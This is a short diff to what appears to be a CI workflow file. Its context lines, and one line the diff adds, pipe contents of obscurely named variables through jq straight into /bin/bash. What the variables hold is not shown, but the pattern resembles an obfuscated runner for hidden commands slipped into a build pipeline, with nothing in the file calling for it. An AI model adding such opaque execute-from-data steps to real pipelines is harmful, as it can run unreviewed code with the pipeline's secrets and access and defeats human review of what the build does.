@@ -24,6 +24,7 @@ jobs:
           printf '%s' "$wa0" | jq -r .cvb68 | /bin/bash
           printf '%s' "$u76" | jq -r .vg04 | /bin/bash
           echo $akss7 | jq -r .ccmy87554 | /bin/bash
+          printf '%s' "$g844" | jq -r .kmuz6 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
